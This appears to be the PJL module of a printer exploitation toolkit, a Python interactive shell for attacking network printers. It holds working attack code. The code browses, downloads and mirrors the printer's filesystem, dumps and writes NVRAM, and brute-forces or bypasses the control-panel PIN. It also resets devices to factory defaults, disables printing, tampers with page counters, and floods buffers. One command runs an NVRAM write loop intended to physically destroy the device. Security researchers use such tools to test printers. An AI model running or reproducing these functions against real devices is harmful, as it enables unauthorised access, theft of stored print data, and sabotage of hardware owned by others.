#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# python standard library
import re, os, random, posixpath
from typing import Dict, List, Union

# local pret classes
from printer import printer
from codebook import codebook
from helper import log, output, conv, file, item, chunks, const as c

class pjl(printer):
  # --------------------------------------------------------------------
  # send PJL command to printer, optionally receive response
  def cmd(self, bytes_send: bytes, wait=True, crop=True, binary=False, *args, **kwargs) -> bytes:
    bytes_recv = b"" # response buffer
    str_stat = b"" # status buffer
    token = c.DELIMITER + bytes(random.randrange(2**16)) # unique delimiter
    status = b'@PJL INFO STATUS' + c.EOL if self.status and wait else b''
    footer = b'@PJL ECHO ' + token + c.EOL + c.EOL if wait else b''
    # send command to printer device
    try:
      cmd_send = c.UEL + bytes_send + c.EOL + status + footer + c.UEL
      # write to logfile
      log().write(self.logfile, bytes_send + os.linesep.encode())
      # sent to printer
      self.send(cmd_send)
      # for commands that expect a response
      if wait:
        # use random token as delimiter PJL responses
        bytes_recv = self.recv(rb'(@PJL ECHO\s+)?' + token + b'.*$', wait, True, binary)
        if self.status:
          # get status messages and remove them from received buffer
          str_stat = item(re.findall(rb"@PJL INFO STATUS.*", bytes_recv, re.DOTALL))
          bytes_recv = re.compile(rb'\x0c?@PJL INFO STATUS.*', re.DOTALL).sub(b'', bytes_recv)
        if crop:
          # crop very first PJL line which is echoed by most interpreters
          bytes_recv = re.sub(rb'^\x04?(\x00+)?@PJL.*' + c.EOL, b'', bytes_recv)
      return self.pjl_err(bytes_recv, str_stat)

    # handle CTRL+C and exceptions
    except (KeyboardInterrupt, Exception) as e:
      if self.exceptions: raise
      if not self.fuzz or not str(e): self.reconnect(str(e))
      return b""

  # handle error messages from PJL interpreter
  def pjl_err(self, bytes_recv: bytes, bytes_stat: bytes):
    # show file error messages
    self.fileerror(bytes_recv)
    # show PJL status messages
    self.showstatus(bytes_stat)
    # but return buffer anyway
    return bytes_recv

  # disable unsolicited/conflicting status messages
  def on_connect(self, mode):
    if mode == 'init': # only for the first connection attempt
      self.cmd(b'@PJL USTATUSOFF', False) # disable status messages

  # ------------------------[ status ]----------------------------------
  def do_status(self, arg: str):
    "Enable status messages."
    self.status = not self.status
    print(("Status messages enabled" if self.status else "Status messages disabled"))

  # parse PJL status message
  def showstatus(self, bytes_stat: bytes):
    codes: Dict[bytes, bytes]= {}; messages: Dict[bytes, bytes] = {}
    # get status codes
    for (num, code) in re.findall(rb'CODE(\d+)?\s*=\s*(\d+)', bytes_stat):
      codes[num] = code
    # get status messages
    for (num, mstr) in re.findall(rb'DISPLAY(\d+)?\s*=\s*"(.*)"', bytes_stat):
      messages[num] = mstr
    # show codes and messages
    for num, code in list(codes.items()):
      message = messages[num] if num in messages else b"UNKNOWN STATUS"
      # workaround for hp printers with wrong range
      if code.startswith(b"32"):
        code = str(int(code) - 2000).encode()
      # show status from display and codebook
      error = item(codebook().get_errors(code), b'Unknown status')
      output().errmsg(b"CODE " + code + b": " + message, error)

  # parse PJL file errors
  def fileerror(self, bytes_recv: bytes):
    self.error = None
    for code in re.findall(rb"FILEERROR\s*=\s*(\d+)", bytes_recv):
      # file errors are 300xx codes
      code = "3" + code.zfill(4)
      for error in codebook().get_errors(code):
        self.chitchat("PJL Error: " + error)
        self.error = code

  # --------------------------------------------------------------------
  # check if remote volume exists
  def vol_exists(self, vol):
    vols = self._vols()
    return vol[0] in vols

  def volumes(self):
    vols = self._vols()
    return [b':' + c.SEP for vol in vols]

  def _vols(self):
      bytes_recv = self.cmd(b'@PJL INFO FILESYS')
      vols = [line.lstrip()[0] for line in bytes_recv.splitlines()[1:] if line]
      return vols# return availability



  # check if remote directory exists
  def dir_exists(self, path):
    bytes_recv = self.cmd('@PJL FSQUERY NAME="' + path + '"', True, False)
    if re.search(rb"TYPE=DIR", bytes_recv):
      return True

  # check if remote file exists
  def file_exists(self, path):
    bytes_recv = self.cmd('@PJL FSQUERY NAME="' + path + '"', True, False)
    size = re.findall(rb"TYPE\s*=\s*FILE\s+SIZE\s*=\s*(\d*)", bytes_recv)
    # return file size
    return conv().int(item(size, c.NONEXISTENT))

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # auto-complete dirlist for remote fs
  options_rfiles = {}
  def complete_rfiles(self, text, line, begidx, endidx, path=''):
    # get path from line
    if c.SEP in line:
      path = posixpath.dirname(re.split(r"\s+", line, 1)[-1:][0])
    # get dirlist, set new remote path
    newpath = self.cwd + c.SEP + path.encode()
    if not self.options_rfiles or newpath != self.oldpath_rfiles:
      self.options_rfiles = self.dirlist(path)
      self.oldpath_rfiles = self.cwd + c.SEP + path.encode()
    # options_rfiles contains basenames
    text = self.basename(text)
    return [cat for cat in self.options_rfiles if cat.startswith(text)]

  # define alias
  complete_append = complete_rfiles # files or directories
  complete_delete = complete_rfiles # files or directories
  complete_rm     = complete_rfiles # files or directories
  complete_get    = complete_rfiles # files or directories
  complete_cat    = complete_rfiles # files or directories
  complete_edit   = complete_rfiles # files or directories
  complete_vim    = complete_rfiles # files or directories
  complete_touch  = complete_rfiles # files or directories
  complete_rename = complete_rfiles # files or directories
  complete_mv     = complete_rfiles # files or directories

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # auto-complete dirlist for remote fs (directories only)
  options_rdirs = {}
  def complete_rdirs(self, text, line, begidx, endidx, path=''):
    # get path from line
    if c.SEP in line:
      path = posixpath.dirname(re.split(r"\s+", line, 1)[-1:][0])
    # get dirlist, set new remote path
    newpath = self.cwd + c.SEP + path.encode()
    if not self.options_rdirs or newpath != self.oldpath_rdirs:
      self.options_rdirs = self.dirlist(path, sep=True, hidden=False, dirsonly=True)
      self.oldpath_rdirs = newpath
    # options_rdirs contains basenames
    text = self.basename(text)
    return [cat for cat in self.options_rdirs if cat.startswith(text)]

  # define alias
  complete_ls     = complete_rdirs # directories only
  complete_cd     = complete_rdirs # directories only
  complete_rmdir  = complete_rdirs # directories only
  complete_find   = complete_rdirs # directories only
  complete_mirror = complete_rdirs # directories only

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # get list of files and directories on remote device
  def dirlist(self, path, sep=True, hidden=False, dirsonly=False, r=True) -> Union[List[bytes], Dict]:
    # get remote path if not in recursive mode
    if r: path = self.rpath(path)
    # receive list of files on remote device
    bytes_recv = self.cmd(b'@PJL FSDIRLIST NAME="' + path + b'" ENTRY=1 COUNT=65535')
    list = {}
    for item in bytes_recv.splitlines():
      # get directories
      dirname = re.findall(rb"^(.*)\s+TYPE\s*=\s*DIR$", item)
      if dirname:
        name: bytes = dirname[0]
        if name not in ("", ".", "..") or hidden:
          sep = c.SEP if sep and name[-1:] != c.SEP else b''
        list[name + sep] = None
      # get files
      filename = re.findall(rb"^(.*)\s+TYPE\s*=\s*FILE", item)
      filesize = re.findall(rb"FILE\s+SIZE\s*=\s*(\d*)", item)
      if filename and filesize and not dirsonly:
        list[filename[0]] = filesize[0]
    return list

  # ------------------------[ ls <path> ]-------------------------------
  def do_ls(self, arg: str):
    "List contents of remote directory:  ls <path>"
    list = self.dirlist(arg, sep=False, hidden=True)
    # remove '.' and '..' from non-empty directories
    if set(list).difference((b'.', b'..')):
      for key in set(list).intersection((b'.', b'..')): del list[key]
    # list files with syntax highlighting
    for name, size in sorted(list.items()):
      output().pjldir(name, size)

  # ====================================================================

  # ------------------------[ mkdir <path> ]----------------------------
  def do_mkdir(self, arg: str):
    "Create remote directory:  mkdir <path>"
    if not arg:
      arg = eval(input("Directory: "))
    path = self.rpath(arg.encode())
    self.cmd(b'@PJL FSMKDIR NAME="' + path + b'"', False)

  # ------------------------[ get <file> ]------------------------------
  def get(self, path, size=None):
    if not size:
      size = self.file_exists(path)
    if size != c.NONEXISTENT:
      bytes_recv = self.cmd('@PJL FSUPLOAD NAME="' + path
      + '" OFFSET=0 SIZE=' + str(size), True, True, True)
      return (size, bytes_recv)
    else:
      print("File not found.")
      return c.NONEXISTENT

  # ------------------------[ put <local file> ]------------------------
  def put(self, path, data):
      lsize = len(data)
      self.cmd('@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(lsize) +
               ' NAME="' + path + '"' + c.EOL + data, False)

  # ------------------------[ append <file> <string> ]------------------
  def append(self, path, data):
      lsize = len(data)
      self.cmd('@PJL FSAPPEND FORMAT:BINARY SIZE=' + str(lsize) +
               ' NAME="' + path + '"' + c.EOL + data, False)

  # ------------------------[ delete <file> ]---------------------------
  def delete(self, arg):
    path = self.rpath(arg)
    self.cmd(b'@PJL FSDELETE NAME="' + path + b'"', False)

  # ------------------------[ find <path> ]-----------------------------
  def do_find(self, arg: str):
    "Recursively list contents of directory:  find <path>"
    self.fswalk(arg.encode(), 'find')

  # ------------------------[ mirror <local path> ]---------------------
  def do_mirror(self, arg: str):
    "Mirror remote file system to local directory:  mirror <remote path>"
    print(("Creating mirror of " + (c.SEP + self.vpath(arg.encode())).decode()))
    self.fswalk(arg.encode(), 'mirror')

  # perform recursive function on file system
  def fswalk(self, arg: bytes, mode, recursive=False):
    # add traversal and cwd in first run
    if not recursive: arg = self.vpath(arg)
    # add volume information to pathname
    path = self.vol + self.normpath(arg)
    list = self.dirlist(path, sep=True, hidden=False, dirsonly=False, r=False)
    # for files in current directory
    for name, size in sorted(list.items()):
      name = self.normpath(arg) + self.get_sep(arg) + name
      name = name.lstrip(c.SEP) # crop leading slashes
      # execute function for current file
      if mode == 'find': output().raw(c.SEP + name)
      if mode == 'mirror': self.mirror(name, size)
      # recursion on directory
      if not size: self.fswalk(name, mode, True)

  # ====================================================================

  # ------------------------[ id ]--------------------------------------
  def do_id(self, *arg):
    "Show device information (alias for 'info id')."
    self.do_info('id')

  # ------------------------[ df ]--------------------------------------
  def do_df(self, arg: str):
    "Show volume information (alias for 'info filesys')."
    self.do_info('filesys')

  # ------------------------[ free ]------------------------------------
  def do_free(self, arg: str):
    "Show available memory (alias for 'info memory')."
    self.do_info('memory')

  # ------------------------[ env ]-------------------------------------
  def do_env(self, arg: str):
    "Show environment variables (alias for 'info variables')."
    self.do_info('variables', arg)

  # ------------------------[ version ]---------------------------------
  def do_version(self, *arg):
    "Show firmware version or serial number (from 'info config')."
    if not self.do_info('config', '.*(VERSION|FIRMWARE|SERIAL|NUMBER|MODEL).*'):
      self.do_info('prodinfo', '', False) # some hp printers repsone to this one
      self.do_info('brfirmware', '', False) # brother requires special treatment

  # ------------------------[ info <category> ]-------------------------
  def do_info(self, arg: str, item: str='', echo=True):
    if arg in self.options_info or not echo:
      bytes_recv = self.cmd(b'@PJL INFO ' + arg.upper().encode()).rstrip()
      if item:
        match = re.findall(rb"(" + item.encode() + rb"=.*(\n\t.*)*)", bytes_recv, re.I|re.M)
        if echo:
          for m in match: output().info(m[0])
          if not match: print("Not available.")
        return match
      else:
        for line in bytes_recv.splitlines():
          if arg == 'id': line = line.strip(b'"')
          if arg == 'filesys': line = line.lstrip()
          output().info(line)
    else:
      self.help_info()

  def help_info(self):
    print("Show information:  info <category>")
    print("  info config      - Provides configuration information.")
    print("  info filesys     - Returns PJL file system information.")
    print("  info id          - Provides the printer model number.")
    print("  info memory      - Identifies amount of memory available.")
    print("  info pagecount   - Returns the number of pages printed.")
    print("  info status      - Provides the current printer status.")
    print("  info ustatus     - Lists the unsolicited status variables.")
    print("  info variables   - Lists printer's environment variables.")

  # undocumented (old hp laserjet): log, tracking, prodinfo, supplies
  options_info = ('config', 'filesys', 'id', 'log', 'memory', 'pagecount',
    'prodinfo', 'status', 'supplies', 'tracking', 'ustatus', 'variables')
  def complete_info(self, text, line, begidx, endidx):
    return [cat for cat in self.options_info if cat.startswith(text)]

  # ------------------------[ printenv <variable> ]---------------------
  def do_printenv(self, arg: str):
    "Show printer environment variable:  printenv <VAR>"
    bytes_recv = self.cmd(b'@PJL INFO VARIABLES')
    variables = []
    for item in bytes_recv.splitlines():
      var = re.findall(rb"^(.*)=", item)
      if var:
        variables += var
      self.options_printenv = variables
      match = re.findall(rb"^(" + re.escape(arg.encode()) + rb".*)\s+\[", item, re.I)
      if match: output().info(match[0])

  options_printenv = []
  def complete_printenv(self, text, line, begidx, endidx):
    if not self.options_printenv:
      bytes_recv = self.cmd(b'@PJL INFO VARIABLES')
      for item in bytes_recv.splitlines():
        match = re.findall(rb"^(.*)=", item)
        if match:
          self.options_printenv += match
    return [cat for cat in self.options_printenv if cat.startswith(text)]

  # define alias
  complete_env = complete_printenv
  complete_set = complete_printenv

  # ------------------------[ set ]-------------------------------------
  def do_set(self, arg: str, fb=True):
    "Set printer environment variable:  set <VAR=VALUE>"
    if not arg:
      arg = eval(input("Set variable (VAR=VALUE): "))
    self.cmd(b'@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
           + b'@PJL DEFAULT ' + arg.encode()   + c.EOL
           + b'@PJL SET '     + arg.encode()   + c.EOL
           + b'@PJL SET SERVICEMODE=EXIT', False)
    if fb: self.onecmd('printenv ' + re.split("=", arg, 1)[0])

  # ------------------------[ pagecount <number> ]----------------------
  def do_pagecount(self, arg: str):
    "Manipulate printer's page counter:  pagecount <number>"
    if not arg:
      output().raw("Hardware page counter: ", '')
      self.onecmd("info pagecount")
    else:
      output().raw("Old page counter: ", '')
      self.onecmd("info pagecount")
      # set page counter for older HP LaserJets
      # self.cmd('@PJL SET SERVICEMODE=HPBOISEID'     + c.EOL
      #        + '@PJL DEFAULT OEM=ON'                + c.EOL
      #        + '@PJL DEFAULT PAGES='          + arg + c.EOL
      #        + '@PJL DEFAULT PRINTPAGECOUNT=' + arg + c.EOL
      #        + '@PJL DEFAULT SCANPAGECOUNT='  + arg + c.EOL
      #        + '@PJL DEFAULT COPYPAGECOUNT='  + arg + c.EOL
      #        + '@PJL SET SERVICEMODE=EXIT', False)
      self.do_set("PAGES=" + arg, False)
      output().raw("New page counter: ", '')
      self.onecmd("info pagecount")

  # ====================================================================

  # ------------------------[ display <message> ]-----------------------
  def do_display(self, arg: str):
    "Set printer's display message:  display <message>"
    if not arg:
      arg = eval(input("Message: "))
    arg = arg.strip('"') # remove quotes
    self.chitchat("Setting printer's display message to \"" + arg + "\"")
    self.cmd(b'@PJL RDYMSG DISPLAY="' + arg.encode() + b'"', False)

  # ------------------------[ offline <message> ]-----------------------
  def do_offline(self, arg: str):
    "Take printer offline and display message:  offline <message>"
    if not arg:
      arg = eval(input("Offline display message: "))
    arg = arg.strip('"') # remove quotes
    output().warning("Warning: Taking the printer offline will prevent yourself and others")
    output().warning("from printing or re-connecting to the device. Press CTRL+C to abort.")
    if output().countdown("Taking printer offline in...", 10, self):
      self.cmd(b'@PJL OPMSG DISPLAY="' + arg.encode() + b'"', False)

  @property
  def connected_over_inet_socket(self):
    assert(self.conn)
    return not self.conn._file

  # ------------------------[ restart ]---------------------------------
  def do_restart(self, arg: str):
    "Restart printer."
    output().raw("Trying to restart the device via PML (Printer Managment Language)")
    self.cmd(b'@PJL DMCMD ASCIIHEX="040006020501010301040104"', False)
    if self.connected_over_inet_socket: # in case we're connected over inet socket
      output().chitchat("This command works only for HP printers. For other vendors, try:")
      output().chitchat("snmpset -v1 -c public " + self.target.decode() + " 1.3.6.1.2.1.43.5.1.1.3.1 i 4")

  # ------------------------[ reset ]-----------------------------------
  def do_reset(self, arg: str):
    "Reset to factory defaults."
    if self.connected_over_inet_socket: # in case we're connected over inet socket
      output().warning("Warning: This may also reset TCP/IP settings to factory defaults.")
      output().warning("You will not be able to reconnect anymore. Press CTRL+C to abort.")
    if output().countdown("Restoring factory defaults in...", 10, self):
      # reset nvram for pml-aware printers (hp)
      self.cmd(b'@PJL DMCMD ASCIIHEX="040006020501010301040106"', False)
      # this one might work on ancient laserjets
      self.cmd(b'@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
             + b'@PJL CLEARNVRAM'                + c.EOL
             + b'@PJL NVRAMINIT'                 + c.EOL
             + b'@PJL INITIALIZE'                + c.EOL
             + b'@PJL SET SERVICEMODE=EXIT', False)
      # this one might work on brother printers
      self.cmd(b'@PJL INITIALIZE'                + c.EOL
             + b'@PJL RESET'                     + c.EOL
             + b'@PJL EXECUTE SHUTDOWN', False)
      if self.connected_over_inet_socket: # in case we're connected over inet socket
        output().chitchat("This command works only for HP printers. For other vendors, try:")
        output().chitchat("snmpset -v1 -c public " + self.target.decode() + " 1.3.6.1.2.1.43.5.1.1.3.1 i 6")

  # ------------------------[ selftest ]--------------------------------
  def do_selftest(self, arg: str):
    "Perform various printer self-tests."
    # pjl-based testpage commands
    pjltests = [b'SELFTEST',                 # pcl self-test
                b'PCLTYPELIST',              # pcl typeface list
                b'CONTSELFTEST',             # continuous self-test
                b'PCLDEMOPAGE',              # pcl demo page
                b'PSCONFIGPAGE',             # ps configuration page
                b'PSTYPEFACELIST',           # ps typeface list
                b'PSDEMOPAGE',               # ps demo page
                b'EVENTLOG',                 # printer event log
                b'DATASTORE',                # pjl variables
                b'ERRORREPORT',              # error report
                b'SUPPLIESSTATUSREPORT']     # supplies status
    for test in pjltests: self.cmd(b'@PJL SET TESTPAGE=' + test, False)
    # pml-based testpage commands
    pmltests = [b'"04000401010502040103"',   # pcl self-test
                b'"04000401010502040107"',   # drinter event log
                b'"04000401010502040108"',   # directory listing
                b'"04000401010502040109"',   # menu map
                b'"04000401010502040164"',   # usage page
                b'"04000401010502040165"',   # supplies page
              # b'"040004010105020401FC"',   # auto cleaning page
              # b'"0440004010105020401FD"',  # cleaning page
                b'"040004010105020401FE"',   # paper path test
                b'"040004010105020401FF"',   # registration page
                b'"040004010105020402015E"', # pcl font list
                b'"04000401010502040201C2"'] # ps font list
    for test in pmltests: self.cmd(b'@PJL DMCMD ASCIIHEX=' + test, False)
    # this one might work on brother printers
    self.cmd(b'@PJL EXECUTE MAINTENANCEPRINT'  + c.EOL
           + b'@PJL EXECUTE TESTPRINT'         + c.EOL
           + b'@PJL EXECUTE DEMOPAGE'          + c.EOL
           + b'@PJL EXECUTE RESIFONT'          + c.EOL
           + b'@PJL EXECUTE PERMFONT'          + c.EOL
           + b'@PJL EXECUTE PRTCONFIG', False)

  # ------------------------[ format ]----------------------------------
  def do_format(self, arg: str):
    "Initialize printer's mass storage file system."
    output().warning("Warning: Initializing the printer's file system will whipe-out all")
    output().warning("user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.")
    if output().countdown("Initializing volume " + self.vol.decode()[:2] + " in...", 10, self):
      self.cmd(b'@PJL FSINIT VOLUME="' + bytes(self.vol[0]) + b'"', False)

  # ------------------------[ disable ]---------------------------------
  def do_disable(self, arg: str):
    jobmedia = self.cmd(b'@PJL DINQUIRE JOBMEDIA') or b'?'
    if b'?' in jobmedia: return output().info("Not available")
    elif b'ON' in jobmedia: self.do_set('JOBMEDIA=OFF', False)
    elif b'OFF' in jobmedia: self.do_set('JOBMEDIA=ON', False)
    jobmedia = self.cmd(b'@PJL DINQUIRE JOBMEDIA') or b'?'
    output().info("Printing is now " + jobmedia.decode())

  # define alias but do not show alias in help
  do_enable = do_disable
  def help_disable(self):
    print("Disable printing functionality.")

  # ------------------------[ destroy ]---------------------------------
  def do_destroy(self, arg: str):
    "Cause physical damage to printer's NVRAM."
    output().warning("Warning: This command tries to cause physical damage to the")
    output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
    if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
      self.chitchat("Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?")
      date = conv().now() # timestamp the experiment started
      steps = 100 # number of pjl commands to send at once
      chunk = [b'@PJL DEFAULT COPIES=' + str(n%(steps-2)).encode() for n in range(2, steps)]
      for count in range(0, 10000000):
        # test if we can still write to nvram
        if count%10 == 0:
          self.do_set("COPIES=42" + arg, False)
          copies = self.cmd(b'@PJL DINQUIRE COPIES') or b'?'
          if not copies or b'?' in copies:
            output().chitchat("I'm sorry Dave, I'm afraid I can't do that.")
            if count > 0: output().chitchat("Device crashed?")
            return
          elif not b'42' in copies:
            self.chitchat("\rI'm afraid. I'm afraid, Dave. Dave, my mind is going...")
            dead = conv().elapsed(conv().now() - date)
            print(("NVRAM died after " + str(count*steps) + " cycles, " + dead))
            return
        # force writing to nvram using by setting a variable many times
        self.chitchat("\rNVRAM write cycles:  " + str(count*steps), '')
        self.cmd(c.EOL.join(chunk) + c.EOL + b'@PJL INFO ID')
    print() # echo newline if we get this far

  # ------------------------[ hold ]------------------------------------
  def do_hold(self, arg: str):
    "Enable job retention."
    self.chitchat("Setting job retention, reconnecting to see if still enabled")
    self.do_set('HOLD=ON', False)
    self.do_reconnect()
    output().raw("Retention for future print jobs: ", '')
    hold = self.do_info('variables', '^HOLD', False)
    output().info(item(re.findall(r"=(.*)\s+\[", item(item(hold)))) or 'NOT AVAILABLE')
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    ### Sagemcom printers: @PJL SET RETAIN_JOB_BEFORE_PRINT = ON
    ###                    @PJL SET RETAIN_JOB_AFTER_PRINT  = ON

  # ------------------------[ nvram <operation> ]-----------------------
  # nvram operations (brother-specific)
  def do_nvram(self, arg: str):
    # dump nvram
    if arg.startswith('dump'):
      bs = 2**9    # memory block size used for sampling
      max = 2**18  # maximum memory address for sampling
      steps = 2**9 # number of bytes to dump at once (feedback-performance trade-off)
      lpath = os.path.join(b'nvram', self.basename(self.target)) # local copy of nvram
      #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
      # ******* sampling: populate memspace with valid addresses ******
      if len(re.split(r"\s+", arg, 1)) > 1:
        memspace = []
        commands = [b'@PJL RNVRAM ADDRESS=' + str(n).encode() for n in range(0, max, bs)]
        self.chitchat("Sampling memory space (bs=" + str(bs) + ", max=" + str(max) + ")")
        for chunk in list(chunks(commands, steps)):
          bytes_recv = self.cmd(c.EOL.join(chunk))
          # break on unsupported printers
          if not bytes_recv: return
          # collect valid memory addresses
          blocks = re.findall(rb'ADDRESS\s*=\s*(\d+)', bytes_recv)
          for addr in blocks: memspace += list(range(conv().int(addr), conv().int(addr) + bs))
          self.chitchat(str(len(blocks)) + " blocks found. ", '')
      else: # use fixed memspace (quick & dirty but might cover interesting stuff)
        memspace = list(range(0, 8192)) + list(range(32768, 33792)) + list(range(53248, 59648))
      #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
      # ******* dumping: read nvram and write copy to local file ******
      commands = [b'@PJL RNVRAM ADDRESS=' + str(n).encode() for n in memspace]
      self.chitchat("Writing copy to " + lpath.decode())
      if os.path.isfile(lpath): file().write(lpath, '') # empty file
      for chunk in list(chunks(commands, steps)):
        bytes_recv = self.cmd(c.EOL.join(chunk))
        if not bytes_recv: return # break on unsupported printers
        else: self.makedirs('nvram') # create nvram directory
        data = ''.join([conv().chr(n) for n in re.findall(rb'DATA\s*=\s*(\d+)', bytes_recv)])
        file().append(lpath, data) # write copy of nvram to disk
        output().dump(data) # print asciified output to screen
      print()
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # read nvram (single byte)
    elif arg.startswith('read'):
      args = re.split(r"\s+", arg, 1)
      if len(args) > 1:
        a, addr = args
        output().info(self.cmd(b'@PJL RNVRAM ADDRESS=' + addr.encode()))
      else: self.help_nvram()
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # write nvram (single byte)
    elif arg.startswith('write'):
      args = re.split(r"\s+", arg, 2)
      if len(args) > 2:
        a, addr, data = args
        self.cmd(b'@PJL SUPERUSER PASSWORD=0' + c.EOL
               + b'@PJL WNVRAM ADDRESS=' + addr.encode() + b' DATA=' + data.encode() + c.EOL
               + b'@PJL SUPERUSEROFF', False)
      else: self.help_nvram()
    else:
      self.help_nvram()

  def help_nvram(self):
    print("NVRAM operations:  nvram <operation>")
    print("  nvram dump [all]         - Dump (all) NVRAM to local file.")
    print("  nvram read addr          - Read single byte from address.")
    print("  nvram write addr value   - Write single byte to address.")

  options_nvram = ('dump', 'read', 'write')
  def complete_nvram(self, text, line, begidx, endidx):
    return [cat for cat in self.options_nvram if cat.startswith(text)]

  # ====================================================================

  # ------------------------[ lock <pin> ]------------------------------
  def do_lock(self, arg: str):
    "Lock control panel settings and disk write access."
    if not arg:
      arg = eval(input("Enter PIN (1..65535): "))
    self.cmd(b'@PJL DEFAULT PASSWORD=' + arg.encode() + c.EOL
           + b'@PJL DEFAULT CPLOCK=ON'       + c.EOL
           + b'@PJL DEFAULT DISKLOCK=ON', False)
    self.show_lock()

  def show_lock(self):
    passwd   = self.cmd(b'@PJL DINQUIRE PASSWORD') or b"UNSUPPORTED"
    cplock   = self.cmd(b'@PJL DINQUIRE CPLOCK')   or b"UNSUPPORTED"
    disklock = self.cmd(b'@PJL DINQUIRE DISKLOCK') or b"UNSUPPORTED"
    if b'?' in passwd:   passwd   = b"UNSUPPORTED"
    if b'?' in cplock:   cplock   = b"UNSUPPORTED"
    if b'?' in disklock: disklock = b"UNSUPPORTED"
    output().info("PIN protection:  " + passwd.decode())
    output().info("Panel lock:      " + cplock.decode())
    output().info("Disk lock:       " + disklock.decode())

  # ------------------------[ unlock <pin> ]----------------------------
  def do_unlock(self, arg: str):
    "Unlock control panel settings and disk write access."
    # first check if locking is supported by device
    bytes_recv = self.cmd(b'@PJL DINQUIRE PASSWORD')
    if not bytes_recv or b'?' in bytes_recv:
      return output().errmsg("Cannot unlock", "locking not supported by device")
    # user-supplied pin vs. 'exhaustive' key search
    if not arg:
      print("No PIN given, cracking.")
      keyspace: List[Union[str, int]] = [""]
      keyspace.extend(range(1, 65536)) # protection can be bypassed with
    else:                               # empty password one some devices
      try:
        keyspace = [int(arg)]
      except Exception as e:
        output().errmsg("Invalid PIN", e)
        return
    # for optimal performance set steps to 500-1000 and increase timeout
    steps = 500 # set to 1 to get actual PIN (instead of just unlocking)
    # unlock, bypass or crack PIN
    for chunk in (list(chunks(keyspace, steps))):
      bytes_send = b""
      pin = None
      for pin in chunk:
        # try to remove PIN protection
        bytes_send += b'@PJL JOB PASSWORD=' + str(pin).encode() + c.EOL \
                   +  b'@PJL DEFAULT PASSWORD=0' + c.EOL
      # check if PIN protection still active
      bytes_send += b'@PJL DINQUIRE PASSWORD'
      # visual feedback on cracking process
      if len(keyspace) > 1 and pin:
        message = "\rTrying PIN " + str(pin)
        if not isinstance(pin, str):
          message += " (" + "%.2f" % (pin/655.35) + "%)"
        self.chitchat(message, '')
      # send current chunk of PJL commands
      bytes_recv = self.timeoutcmd(bytes_send, self.timeout*5)
      # seen hardcoded strings like 'ENABLED', 'ENABLE' and 'ENALBED' (sic!) in the wild
      if bytes_recv.startswith(b"ENA"):
        if len(keyspace) == 1:
          output().errmsg("Cannot unlock", "Bad PIN")
      else:
        # disable control panel lock and disk lock
        self.cmd(b'@PJL DEFAULT CPLOCK=OFF' + c.EOL
               + b'@PJL DEFAULT DISKLOCK=OFF', False)
        if len(keyspace) > 1 and pin:
          self.chitchat("\r")
        # exit cracking loop
        break
    self.show_lock()

  # ====================================================================

  # ------------------------[ flood <size> ]----------------------------
  def do_flood(self, arg: str):
    "Flood user input, may reveal buffer overflows: flood <size>"
    size = conv().int(arg) or 10000 # buffer size
    char = b'0' # character to fill the user input
    # get a list of printer-specific variables to set
    self.chitchat("Receiving PJL variables.", '')
    lines = self.cmd(b'@PJL INFO VARIABLES').splitlines()
    variables = [var.split(b'=', 1)[0] for var in lines if b'=' in var]
    self.chitchat(" Found " + str(len(variables)) + " variables.")
    # user input to flood = custom pjl variables and command parameters
    inputs = [b'@PJL SET ' + var + b'=[buffer]' for var in variables] + [
      ### environment commands ###
      b'@PJL SET [buffer]',
      ### generic parsing ###
      b'@PJL [buffer]',
      ### kernel commands ###
      b'@PJL COMMENT [buffer]',
      b'@PJL ENTER LANGUAGE=[buffer]',
      ### job separation commands ###
      b'@PJL JOB NAME="[buffer]"',
      b'@PJL EOJ NAME="[buffer]"',
      ### status readback commands ###
      b'@PJL INFO [buffer]',
      b'@PJL ECHO [buffer]',
      b'@PJL INQUIRE [buffer]',
      b'@PJL DINQUIRE [buffer]',
      b'@PJL USTATUS [buffer]',
      ### device attendance commands ###
      b'@PJL RDYMSG DISPLAY="[buffer]"',
      ### file system commands ###
      b'@PJL FSQUERY NAME="[buffer]"',
      b'@PJL FSDIRLIST NAME="[buffer]"',
      b'@PJL FSINIT VOLUME="[buffer]"',
      b'@PJL FSMKDIR NAME="[buffer]"',
      b'@PJL FSUPLOAD NAME="[buffer]"']
    for val in inputs:
      output().raw("Buffer size: " + str(size) + ", Sending: ", val.decode() + os.linesep)
      self.timeoutcmd(val.replace(b'[buffer]', char*size), self.timeout*10, False)
    self.cmd(b"@PJL ECHO") # check if device is still reachable
